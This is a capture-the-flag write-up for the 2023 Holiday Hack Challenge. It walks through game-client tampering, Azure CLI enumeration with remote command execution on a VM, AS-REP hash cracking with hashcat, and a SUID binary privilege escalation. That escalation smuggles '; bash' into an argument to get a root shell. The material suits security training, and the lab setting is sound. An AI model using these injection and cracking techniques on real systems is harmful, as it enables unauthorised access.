---
title: "Kringlecon 2023 Writeup"
tags:
- Binary Exploitation
- CI Exploitation
- Cloud Security
- Cryptography
- CTF
- Reverse Engineering
- DMARC
- Web
date: 2024-01-10T19:51:32+05:30
draft: false
---

Happy new year everyone! As every year, I'll begin this one with sharing my writeup for the 2023 Holiday Hack Challenge for Kringlecon.
I must warn you, I was unable to finish all the challenges due to other life events.

With that out of the way, enjoy the writeup!

# Christmas Island: Orientation

## Cranberry Pi

This is a sanity check question to kick the tires. The answer to it simply is
`answer`.

# Christmas Island: Frosty's Beach

## Snowball Fight

We begin with a small snowball fight mini-game called *Santa's Snowball Hero*
where we can either team up with a random player to fight against santa or play
in a private room.

![Title screen of the snowball hero game](/kringlecon/2023/snowball-hero-00.avif)

### Messing with client side variables

Let's join a random match since we're unaware of how the game works right now.
Since the game is run in an iframe, we should select the correct context when
running code in the devtools console. In our case, we must select the iframe
either named `room/` or `hhc23-snowball.holidayhackchallenge.com`.

![](/kringlecon/2023/snowball-hero-01.avif)

Now we can peek into the sources tab in devtools which details the
`snowball_fight.js` loaded for the game to run.

We were given the hint that there might be a way to play the game in
single-player mode. Skimming through the code in `snowball_fight.js`, we notice
the following code snippet.

```js
  var singlePlayer = "false"
  function checkAndUpdateSinglePlayer() {
    const localStorageValue = localStorage.getItem('singlePlayer');
    if (localStorageValue === 'true' || localStorageValue === 'false') {
      singlePlayer = String(localStorageValue === 'true');
    }
    const urlParams = new URLSearchParams(window.location.search);
    const urlValue = urlParams.get('singlePlayer');
    if (urlValue === 'true' || urlValue === 'false') {
      singlePlayer = String(urlValue === 'true');
    }
  }
```

From the above code, we can infer that single-player mode can be activated
by setting the URL parameter `singlePlayer` to `true`. Since the game does
not provide us a *blank* game mode, we will start with the random matchmaking
option. As soon as the iframe loads, however, we run the following code in the
devtools console:

```js
url = new URL(window.location.href)
url.searchParams.set("singlePlayer", "true")
window.location = url.href
```

The code here takes the current URL location, adds the `singlePlayer` to `true`
and sets the current location to the modified URL, causing the page to reload.
This spawns Elf the Dwarf who, I have to admit, has the most overpowered attack.

![](/kringlecon/2023/snowball-hero-02.avif)

To break the already broken enough game, we add the following code to take no hits and stop every opponent from throwing snowballs:

- The `player.takeHit` function takes two arguments. We will overwrite it with a function that accepts the same two arguments but does nothing.
- We set our own throw delay to 0 to become a snowball machine-gun.
- Finally, we set everyone else's throw delay to longer than their lifespans.

```js
player.takeHit = function (a, b) {};
player.throwDelay = 0;
elfThrowDelay = Infinity;
santaThrowDelay = 100000;
```

![](/kringlecon/2023/snowball-hero-03.avif)

![](/kringlecon/2023/snowball-hero-04.avif)

# Christmas Island: Santa's Surf Shack

## Linux 101

This challenge comprises a bunch of command line objectives that have to be completed one after another.
To distinguish one from the other,
> the objectives will be present in blockquotes like this

while my commentary will continue as normal text.

> Perform a directory listing of your home directory to find a troll and retrieve a present!

```
elf@c8dcd11edf76:~$ ls -la
```

```
total 68
drwxr-xr-x 1 elf  elf   4096 Dec  2 22:19 .
drwxr-xr-x 1 root root  4096 Dec  2 22:19 ..
-rw-r--r-- 1 elf  elf     28 Dec  2 22:19 .bash_history
-rw-r--r-- 1 elf  elf    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 elf  elf   3105 Nov 20 18:04 .bashrc
-rw-r--r-- 1 elf  elf    807 Feb 25  2020 .profile
-rw-r--r-- 1 elf  elf    168 Nov 20 18:04 HELP
-rw-r--r-- 1 elf  elf     24 Dec  2 22:19 troll_19315479765589239
drwxr-xr-x 1 elf  elf  24576 Dec  2 22:19 workshop
```

> Find the troll inside the troll

```
elf@c8dcd11edf76:~$ cat troll_19315479765589239 
```

```
troll_24187022596776786
```

> Great, now remove the troll in your home directory.

```
elf@c8dcd11edf76:~$ rm troll_19315479765589239
```

> Print the present working directory using a command.

```
elf@c8dcd11edf76:~$ pwd
```

```
/home/elf
```

> Find the hidden troll

We had inadvertently completed this task earlier when we issued the first `ls
-la` command but the current task requires us to reissue the command.

```
elf@c8dcd11edf76:~$ ls -la
```

```
total 64
drwxr-xr-x 1 elf  elf   4096 Dec 12 04:59 .
drwxr-xr-x 1 root root  4096 Dec  2 22:19 ..
-rw-r--r-- 1 elf  elf     28 Dec  2 22:19 .bash_history
-rw-r--r-- 1 elf  elf    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 elf  elf   3105 Nov 20 18:04 .bashrc
-rw-r--r-- 1 elf  elf    807 Feb 25  2020 .profile
-rw-r--r-- 1 elf  elf      0 Dec 12 04:59 .troll_5074624024543078
-rw-r--r-- 1 elf  elf    168 Nov 20 18:04 HELP
drwxr-xr-x 1 elf  elf  24576 Dec  2 22:19 workshop
```

> Excellent, now find the troll in your command history.

```
elf@c8dcd11edf76:~$ cat .bash_history 
```

```
echo troll_9394554126440791
```

> Find the troll in your environment variables.

```
elf@c8dcd11edf76:~$ env | grep troll
```

```
z_TROLL=troll_20249649541603754
```

> Next, head into the workshop.

```
elf@c8dcd11edf76:~$ cd workshop/
```

> Use grep while ignoring case to find out what toolbox the troll is in.

```
elf@c8dcd11edf76:~/workshop$ grep -iR "troll"
```

```
toolbox_191.txt:tRoLl.4056180441832623
```

> A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.

Let's list the present_engine binary.

```
elf@c8dcd11edf76:~/workshop$ ls present* -l
```

```
-r--r--r-- 1 elf elf 4990336 Dec  2 22:19 present_engine
```

It is not executable. Let's change its attributes to be executable.

```
elf@c8dcd11edf76:~/workshop$ chmod +x present_engine
```

Now we run it.

```
elf@c8dcd11edf76:~/workshop$ ./present_engine 
```

```
troll.898906189498077
```

> Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.

```
elf@c8dcd11edf76:~/workshop$ cd electrical/; mv blown_fuse0 fuse0
```

> Now, make a symbolic link (symlink) named fuse1 that points to fuse0

```
elf@c8dcd11edf76:~/workshop/electrical$ ln -sf fuse0 fuse1
```

> Make a copy of fuse1 named fuse2.

```
elf@c8dcd11edf76:~/workshop/electrical$ cp fuse{1,2}
```

> We need to make sure trolls don't come back. Add the characters "TROLL_REPELLENT" into the file fuse2.

```
elf@c8dcd11edf76:~/workshop/electrical$ echo TROLL_REPELLENT > fuse2
```

> Find the troll somewhere in /opt/troll_den.

```
elf@c8dcd11edf76:~/workshop/electrical$ find /opt/troll_den/ -iname "*troll*"
```

> Find the file somewhere in /opt/troll_den that is owned by the user troll.

```
elf@c8dcd11edf76:~/workshop/electrical$ find /opt/troll_den/ -user troll
```

> Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.

```
elf@c8dcd11edf76:~/workshop/electrical$ find /opt/troll_den/ -size +108k -size -110k
```

```
/opt/troll_den/plugins/portlet-mocks/src/test/java/org/apache/t_r_o_l_l_2579728047101724
```

> List running processes to find another troll.

```
elf@c8dcd11edf76:~/workshop/electrical$ ps -ef | grep troll | grep -v grep
```

```
elf         8512    8509  0 05:11 pts/2    00:00:00 /usr/bin/python3 /14516_troll
```

> The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.

```
elf@c8dcd11edf76:~/workshop/electrical$ netstat -tulp
```

```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:54321           0.0.0.0:*               LISTEN      8512/python3
```

> The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.

```
elf@c8dcd11edf76:~/workshop/electrical$ curl 0.0.0.0:54321
```

```
troll.73180338045875
```

> Your final task is to stop the 14516_troll process to collect the remaining presents.

```
elf@c8dcd11edf76:~/workshop/electrical$ pkill -15 14516_troll
```

> Congratulations, you caught all the trolls and retrieved all the presents!
Type "exit" to close...

```
elf@c8dcd11edf76:~/workshop/electrical$ exit
```

# Rudolph's Rest

## Reportinator

This challenge provides us with a list of vulnerability reports generated
using an LLM tool. Our task is to differentiate the legitimate findings from
the ones hallucinated by the AI. I tried to solve the challenge using my flaky
cybersecurity knowledge but that led me nowhere. After around five attempts, I
caved into writing a simple script to brute force the combination.

```python
import requests

for x in range(0b111111111 + 1):
    form = {
        "input-1": x & 0b1,
        "input-2": x >> 1 & 0b1,
        "input-3": x >> 2 & 0b1,
        "input-4": x >> 3 & 0b1,
        "input-5": x >> 4 & 0b1,
        "input-6": x >> 5 & 0b1,
        "input-7": x >> 6 & 0b1,
        "input-8": x >> 7 & 0b1,
        "input-9": x >> 8 & 0b1,
    }

    resp = requests.post('https://hhc23-reportinator-dot-holidayhack2023.ue.r.appspot.com/check', data=form)
    if "FAILURE" not in resp.text:
        print(form)
        break
```

Here's how the script works: We know that there are nine inputs, each can be 0
or 1. Hence, the inputs can be thought of as an an array of nine bits. It can be
though of as a nine-bit integer! This is also known as a bitfield.

Now, for all the bit permutations within this space, we can iterate over all the
integers from 0 to the maximum nine-bit integer. For readability, we have used
the binary representation `0b111111111` which clearly has nine bits switched
on. Python ranges are inclusive, that is, if we `range()` over some number `n`,
we get all the integers from 0 upto `n` but not including `n`. This is why, we
added 1 to the nine-bit maximum in the `for` loop.

To access each element of this bitfield, we can right shift the number by the
position (divide by 2 to the power of the position), then `and`ing it with 1.
This then allows us to use the bit values in the form we post to the endpoint
that checks the answer.

This is the output we get after running the script:

```json
{
  "input-1": 0,
  "input-2": 0,
  "input-3": 1,
  "input-4": 0,
  "input-5": 0,
  "input-6": 1,
  "input-7": 0,
  "input-8": 0,
  "input-9": 1
}
```

We can submit the same answers manually in the web form, 1 for hallucinated and 0 for legitimate findings. That was my cheeky way of solving the challenge.

## Azure 101

This is akin to the previous challenge with a lot of instructions. For distinction,
> the instructions will be in blockquotes

while my commentary will continue as normal.

> You may not know this but the Azure cli help messages are very easy to access. First, try typing:
```
$ az help | less
```

> Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )

```
$ az account show | less
```

```json
{
  "environmentName": "AzureCloud",
  "id": "2b0942f3-9bca-484b-a508-abdae2db5e64",
  "isDefault": true,
  "name": "northpole-sub",
  "state": "Enabled",
  "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
  "user": {
    "name": "northpole@northpole.invalid",
    "type": "user"
  }
}
```

> Excellent! Now get a list of resource groups in Azure.
For more information:
https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest

```sh
az group list
```

```json
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
    "location": "eastus",
    "managedBy": null,
    "name": "northpole-rg1",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  },
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2",
    "location": "westus",
    "managedBy": null,
    "name": "northpole-rg2",
    "properties": {
      "provisioningState": "Succeeded"
    },
    "tags": {}
  }
]
```

> Ok, now use one of the resource groups to get a list of function apps. For more information:
https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest
Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves.

```
az functionapp list --resource-group northpole-rg1
```

The output of this command is gigantic which is why I chose to clip some unnecessary fields in the resulting JSON.

```json
[
  {
    "appServicePlanId": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/serverfarms/EastUSLinuxDynamicPlan",
    "availabilityState": "Normal",
    "clientAffinityEnabled": false,
    "clientCertEnabled": false,
    "clientCertExclusionPaths": null,
    "clientCertMode": "Required",
    "cloningInfo": null,
    "containerSize": 0,
    "customDomainVerificationId": "201F74B099FA881DB9368A26C8E8B8BB8B9AF75BF450AF717502AC151F59DBEA",
    "dailyMemoryTimeQuota": 0,
    "defaultHostName": "northpole-ssh-certs-fa.azurewebsites.net",
    "enabled": true,
    "enabledHostNames": [
      "northpole-ssh-certs-fa.azurewebsites.net"
    ],
    "extendedLocation": null,
    "hostNameSslStates": [
      {
        "hostType": "Standard",
        "ipBasedSslState": "NotConfigured",
        "name": "northpole-ssh-certs-fa.azurewebsites.net",
        "sslState": "Disabled",
      },
      {
        "certificateResourceId": null,
        "hostType": "Repository",
        "ipBasedSslResult": null,
        "ipBasedSslState": "NotConfigured",
        "name": "northpole-ssh-certs-fa.scm.azurewebsites.net",
        "sslState": "Disabled",
      }
    ],
    "hostNames": [
      "northpole-ssh-certs-fa.azurewebsites.net"
    ],
    "hostNamesDisabled": false,
    "httpsOnly": false,
    "hyperV": false,
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa",
    "identity": {
      "principalId": "d3be48a8-0702-407c-89af-0319780a2aea",
      "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
      "type": "SystemAssigned",
      "userAssignedIdentities": null
    },
    "isXenon": false,
    "keyVaultReferenceIdentity": "SystemAssigned",
    "kind": "functionapp,linux",
    "lastModifiedTimeUtc": "2023-11-09T14:43:01.183333",
    "location": "East US",
    "maxNumberOfWorkers": null,
    "name": "northpole-ssh-certs-fa",
    "outboundIpAddresses": "",
    "possibleOutboundIpAddresses": "",
    "publicNetworkAccess": null,
    "redundancyMode": "None",
    "repositorySiteName": "northpole-ssh-certs-fa",
    "reserved": true,
    "resourceGroup": "northpole-rg1",
    "scmSiteAlsoStopped": false,
    "siteConfig": {
      "acrUseManagedIdentityCreds": false,
      "acrUserManagedIdentityId": null,
      "alwaysOn": false,
      "functionAppScaleLimit": 200,
      "linuxFxVersion": "Python|3.11",
    },
    "slotSwapStatus": null,
    "state": "Running",
    "storageAccountRequired": false,
    "suspendedTill": null,
    "tags": {
      "create-cert-func-url-path": "/api/create-cert?code=candy-cane-twirl",
      "project": "northpole-ssh-certs"
    },
    "targetSwapSlot": null,
    "trafficManagerHostNames": null,
    "type": "Microsoft.Web/sites",
    "usageState": "Normal",
  }
]
```

> Find a way to list the only VM in one of the resource groups you have access to.
For more information:
https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest

```sh
az vm list --resource-group northpole-rg1 | less
```

```
The client 'f17559a4-d8a2-4661-ba0f-c04f8cf2926d' with object id '8deacb33-214d-4d94-9ab4-d27768410f17' does not have authorization to perform action 'Microsoft.Compute/virtualMachines/read' over scope '/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines' or the scope is invalid. If access was recently granted, please refresh your credentials.
```

Oh, okay. Let's try the other resource group.

```sh
az vm list --resource-group northpole-rg2 | less
```

```json
[
  {
    "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg2/providers/Microsoft.Compute/virtualMachines/NP-VM1",
    "location": "eastus",
    "name": "NP-VM1",
    "properties": {
      "hardwareProfile": {
        "vmSize": "Standard_D2s_v3"
      },
      "provisioningState": "Succeeded",
      "storageProfile": {
        "imageReference": {
          "offer": "UbuntuServer",
          "publisher": "Canonical",
          "sku": "16.04-LTS",
          "version": "latest"
        },
        "osDisk": {
          "caching": "ReadWrite",
          "createOption": "FromImage",
          "managedDisk": {
            "storageAccountType": "Standard_LRS"
          },
          "name": "VM1_OsDisk_1"
        }
      },
      "vmId": "e5f16214-18be-4a31-9ebb-2be3a55cfcf7"
    },
    "resourceGroup": "northpole-rg2",
    "tags": {}
  }
]
```

> Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM.
For more information:
https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke

```sh
az vm run-command invoke --resource-group northpole-rg2 --name NP-VM1 --command-id RunShellScript --scripts 'ls'
```

```json
{
  "value": [
    {
      "code": "ComponentStatus/StdOut/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "bin\netc\nhome\njinglebells\nlib\nlib64\nusr\n",
      "time": 1702365773
    },
    {
      "code": "ComponentStatus/StdErr/succeeded",
      "displayStatus": "Provisioning succeeded",
      "level": "Info",
      "message": "",
      "time": 1702365773
    }
  ]
}
```

That finishes the Azure 101 tutorial. Onward with our mighty pirate ship! (Yeah you can actually sail an in-game ship.)

# Island of Misfit Toys: Scaredly Kite Heights

## Hashcat

> In a realm of bytes and digital cheer,  
The festive season brings a challenge near.  
Santa's code has twists that may enthrall,  
It's up to you to decode them all.

> Hidden deep in the snow is a kerberos token,  
Its type and form, in whispers, spoken.  
From reindeers' leaps to the elfish toast,  
Might the secret be in an ASREP roast?

> `hashcat`, your reindeer, so spry and true,  
Will leap through hashes, bringing answers to you.  
But heed this advice to temper your pace,  
`-w 1 -u 1 --kernel-accel 1 --kernel-loops 1`, just in case.

> For within this quest, speed isn't the key,  
Patience and thought will set the answers free.  
So include these flags, let your command be slow,  
And watch as the right solutions begin to show.

> For hints on the hash, when you feel quite adrift,  
This festive link, your spirits, will lift:  
https://hashcat.net/wiki/doku.php?id=example_hashes

> And when in doubt of `hashcat`'s might,  
The CLI docs will guide you right:  
https://hashcat.net/wiki/doku.php?id=hashcat

> Once you've cracked it, with joy and glee so raw,  
Run /bin/runtoanswer, without a flaw.  
Submit the password for Alabaster Snowball,  
Only then can you claim the prize, the best of all.

> So light up your terminal, with commands so grand,  
Crack the code, with `hashcat` in hand!  
Merry Cracking to each, by the pixelated moon's light,  
May your hashes be merry, and your codes so right!

> * Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*

If we list the files in the current directory, we see it contains the files `hash.txt`, `password_list.txt` and a `HELP` file.
Let's take a look at the hash itself.

```
cat hash.txt
```

The hash begins with `$krb5asrep$23$` which aligns with the earlier hint about ASREP roasting.
According to the documentation, the hashcat mode for this hash type is 18200. Let's start cracking.

```sh
hashcat -m18200 hash.txt password_list.txt -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 --force
```

After running the hash through hash cat and passing the provided kernel accelerator
parameters, we get the following password:


```
$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:IluvC4ndyC4nes!
```

We then send it to the runtoanswer binary as proof of work.

```sh
/bin/runtoanswer "IluvC4ndyC4nes!"
```

```
Your answer: IluvC4ndyC4nes!

Checking....
Your answer is correct!
```

## Linux Privesc

```
In a digital winter wonderland we play,
Where elves and bytes in harmony lay.
This festive terminal is clear and bright,
Escalate privileges, and bring forth the light.

Start in the land of bash, where you reside,
But to win this game, to root you must glide.
Climb the ladder, permissions to seize,
Unravel the mystery, with elegance and ease.

There lies a gift, in the root's domain,
An executable file to run, the prize you'll obtain.
The game is won, the challenge complete,
Merry Christmas to all, and to all, a root feat!

* Find a method to escalate privileges inside this terminal and then run the binary in /root *
```

Let's find all the SUID or setuid binaries. These binaries, when executed by any user, will get run as the root user.
We will use the `find` command to search from the filesystem root (`/`) checking for files whose user permissions
are SUID.

```sh
elf@de7b48583aca:~$ find / -perm -u=s -type f 2>/dev/null
```

```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy
```

We have an unusual SUID binary called simplecopy.

Let's look at the command's usage.

```
elf@fee26e77bde5:~$ simplecopy --help
Usage: simplecopy <source> <destination>
```

From the program's name and usage we can assume that it copies files from the source to destination.
Let's take a look at the strings in the file to make sure.

Among a host of other strings, we can notice two interesting strings.

The first is

```
cp %s %s
```

This is a C format string which is very likely used format the the source and destination command line arguments
into a command.

The second interesting string is `system` which the `libc` function used to run the constructed command string.

To verify this, let's pass `--help` as one of the command line arguments explicitly as a string. We will use a comment for the second argument.

```sh
elf@82aefbbef77a:~$ simplecopy '--version' '#comment'
```
  
```
cp (GNU coreutils) 8.30
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Torbjorn Granlund, David MacKenzie, and Jim Meyering.
```

That confirms our hypothesis. The program is vulnerable to command injection.
We can execute a second command by appending a semicolon and our preferred command.
In order to pop a root shell, let's run the bash shell.

The source string becomes `--version; bash` so that we can run bash as root.
We keep the destination string as a comment since we don't use it.

```
elf@82aefbbef77a:~$ simplecopy '--version; bash' '#comment'
```

```
cp (GNU coreutils) 8.30
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Torbjorn Granlund, David MacKenzie, and Jim Meyering.
root@82aefbbef77a:~#
```

Let's go to the root user's home directory.

```sh
cd /root
```

Now let's list the files here.

```sh
ls -la
```

```
total 620
drwx------ 1 root root   4096 Dec  2 22:17 .
drwxr-xr-x 1 root root   4096 Dec 12 09:49 ..
-rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root    161 Dec  5  2019 .profile
-rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer
```

Okay! Time to run the binary and get the answer.

```sh
./runmetoanswer
```

```
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```

# Island of Misfit Toys: Tarnished Trove

Upon arriving here and talking to Dusty Giftwrap, we receive a gameboy cartridge detector.
Walking around and listening for the detector's beep we will find "Elf the Dwarf’s, Gloriously, Unfinished, Adventure! - Vol1"

## Elf the Dwarf’s, Gloriously, Unfinished, Adventure! - Vol1

We are given a webassemby gameboy emulator where we have to move around blocks to fix a QR code.
To know the destination of each block, we can press B (r) to shoot a music note at the block and
an animating motif appears nearby to mark its destination.

![The player elf's dialogue after fixing the QR code](/kringlecon/2023/elf-qr-00.avif)

Once all seven of the blocks are placed in the correct position, we are given a complete QR code to scan.

![QR Code after finishing volume 1](/kringlecon/2023/elf-qr-01.avif)

We save the QR code as an image and scan it with the `zbarimg` command from the `zbartools` suite.

```sh
zbarimg elf_qr.png
```

```
QR-Code:http://8bitelf.com
scanned 1 barcode symbols from 1 images in 0.28 seconds
```

The QR code links to https://8bitelf.com which has the text

```
flag:santaconfusedgivingplanetsqrcode
```

We can submit the flag in our objectives to mark this complete.

## Elf the Dwarf’s, Gloriously, Unfinished, Adventure! - Vol2

![Tinsel Upatree tells us: "Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!"](/kringlecon/2023/elf-the-dwarf-vol2-00-tinsel-upatree.avif)

Hint:
> 1) This feels the same, but different!
> 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding.
> 3) I think I may need to get a DIFFerent perspective.
> 4) I wonder if someone can give me a few pointers to swap.



To focus on the game, let's open the iframe in a new tab.

There are two versions of the game, where the player is either above or below a treeline with an invisible wall in the middle of the map.
We want the player to be able to teleport to the other side of the invisible wall.

In the devtools Sources tab, we can look at the script being loaded under `js/script.js`.

```js
// Load a ROM.
(async function go() {
  let ranNum = Math.round(Math.random()).toString()
  let filename = ROM_FILENAME + ranNum + ".gb";
  console.log(filename);
  let response = await fetch(filename);
  let romBuffer = await response.arrayBuffer();
  const extRam = new Uint8Array(JSON.parse(localStorage.getItem("extram")));
  Emulator.start(await binjgbPromise, romBuffer, extRam);
  emulator.setBuiltinPalette(vm.palIdx);
})();
```

The above excerpt of the script shows how it randomly loads one of two versions of the game. Math.random generates a number from 0 to 1 and Math.round rounds it to either.

```sh
const ROM_FILENAME = "rom/game";
```

With the rom base path defined as `rom/game`, the two versions are at `rom/game0.gb` and `rom/game1.gb` respectively. Let's download them.

![](/kringlecon/2023/elf-the-drawf-vol2-01-game0.avif)

![](/kringlecon/2023/elf-the-drawf-vol2-01-game1.avif)

```sh
wget https://gamegosling.com/vol2-akHB27gg6pN0/rom/game{0,1}.gb
```

Since these are binary files, we will use the hexdiff command for a preliminary look at the differences.

```sh
hexdiff game0.gb game1.gb
```

```hex
   offset      0 1 2 3 4 5 6 7 01234567       offset      0 1 2 3 4 5 6 7 01234567
0x0000000000  0000c33800ffffff ...8....    0x0000000000  0000c33800ffffff ...8....
...
0x0000000148  02030033014271b3 ...3.Bq.    0x0000000148  0203003301427186 ...3.Bq.
0x0000000150  faa1c047faa0c0f3 ...G....    0x0000000150  faa1c047faa0c0f3 ...G....
...
0x0000000590  5405050b4b9a2300 T...K.#.    0x0000000590  540505d2ac3d2d00 T....=-.
0x0000000598  0000000006ad4210 ......B.    0x0000000598  0000000006ad4210 ......B.
...
0x0000016a80  20800c800300000f  .......    0x0000016a80  20800c800b00000f  .......
0x0000016a88  f807000000000f10 ........    0x0000016a88  f807000000000f10 ........
...
0x0000016ab8  0900000ff8070000 ........    0x0000016ab8  0600000ff8070000 ........
0x0000016ac0  00000f1000000000 ........    0x0000016ac0  00000f1000000000 ........
...
0x0000017c80  0200fe80002a0013 .....*..    0x0000017c80  0100fe80002a0013 .....*..
0x0000017c88  fffefffb13ffffff ........    0x0000017c88  fffefffb13ffffff ........
...
0x0000018508  140000fffc140280 ........    0x0000018508  140000fffc140300 ........
0x0000018510  fffd140b80fffe35 .......5    0x0000018510  fffd140400fffe35 .......5
0x0000018518  fffc3200fffc2703 ..2...'.    0x0000018518  fffc3200fffc2703 ..2...'.
...

```

For a better understanding, we write a python script to tell where the files differ and what the different bytes are.

```python
with open('game0.gb', 'rb') as handle:
    g0 = handle.read()

with open('game1.gb', 'rb') as handle:
    g1 = handle.read()

for (i, (a, b)) in enumerate(zip(g0, g1)):
    if a != b:
        print(f"{i:0x}: {a} {b}")
```

ROM data on a cartridge is split into multiple "banks" which can be compared to chunks of maps in modern games that
can be loaded and unloaded at will. The first (`00`) bank mapping to memory from `0x0000` to `0x3fff`, only contains common
code used throughout the game. Since our problem lies in the second "stage" of the game we can ignore the first bank.
More about this can be found at [https://b13rg.github.io/Gameboy-MBC-Analysis/](https://b13rg.github.io/Gameboy-MBC-Analysis/).

Running this gives us the following addresses with the differing bytes:

```
0x16a84: 3 11
0x16ab8: 9 6
0x17c80: 2 1
0x1850e: 2 3
0x1850f: 128 0
0x18513: 11 4
0x18514: 128 0
```

The hint also talk about pointer swapping. This might refer to the X and Y coordinate pointers of our player.
While in one version of the game the initial position pointers might point to the upper half, the other version
has them pointing to a different location.

A quick web search explains that the pointer size for a GameBoy is 16 bits or 2 bytes. Armed with this knowledge,
we can make an infer that the contiguous 2 byte sequences at `0x1850e - 0x1850f` and `0x18513 - 0x18514` must be
the initial position pointers for the second stage of the game.

We will patch the first ROM `game0.gb` with the position pointers of the second ROM `game1.gb`.
The following python code patches the game and saves it as `patched.gb`.

```python
import struct
with open('game0.gb', 'rb') as handle:
    g0 = handle.read()

with open('game1.gb', 'rb') as handle:
    g1 = handle.read()

with open('patched.gb', 'wb') as handle:
    for (i, (a, b)) in enumerate(zip(g0, g1)):
        byte = b if i in (0x1850e, 0x1850f, 0x18513, 0x18514) else a
        byte = struct.pack("B", byte)
        handle.write(byte)
```

We can now use [https://binji.github.io/binjgb/](https://binji.github.io/binjgb/) to run this game.
In this version of the game, our initial position is set next to a portal.

![](/kringlecon/2023/elf-the-drawf-vol2-02.avif)

Interacting with the portal
leads us to a room with ChatNPT and a radio. The radio, upon interacting, plays the following morse code:

![](/kringlecon/2023/elf-the-drawf-vol2-03.avif)

```
--. .-.. ----- .-. -.--
```

This morse code decodes to `GL0RY`.

We can submit this in the objective section to mark this game volume complete!

![](/kringlecon/2023/elf-the-drawf-vol2-04.avif)

# Island of Misfit Toys: Squarewheel Yard

## Luggage Lock

As described in the talk https://www.youtube.com/watch?v=ycM1hBSEyog by Chris Elgee, we apply pressure on the circular keyhole and keep rotating the dials and stopping at a potential digit when we feel resistance.
After a few tries, we get to unlock the luggage.

# Pixel Island: Rainraster Cliffs

## Elf Hunt

Elf Hunt looks like a Duck Hunt clone where the elves are super fast and easy to miss.
We have a cookie called "ElfHunt_JWT" with the JWT value of "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0." which decodes to the header

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

and payload

```json
{
  "speed": -500
}
```

We could play the game by lowering the speed but there's an even easier way.

Looking at the first line of the update function in the loaded `script.js`,

```js
function update() {
  score >= 75 && (sessionJWT.w = !0, document.cookie = `${sessionKeyName}=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.${btoa(JSON.stringify(sessionJWT))}.; path=/; secure; samesite=none;`, gameScene.scene.pause(), window.location.reload())
  // rest of the function
}
```

we notice that the moment the score is greater than or equal to 75, the `w` property of the sessionJWT is set to true, the document cookie is
updated, the game is paused and the window is refreshed. There is no apparent `if-else` condition here because the script uses some clever javascript
code using the `antecedent && consequent` pattern. Since the operands ANDed are lazily evaluated, we just need to set the score to 75 or above.

In devtools console, we simply add the following code:

```js
speed = 75
```

That's how we win the game without even playing it.

# Pixel Island: Rainraster Cliffs

## Certificate SSHenanigans

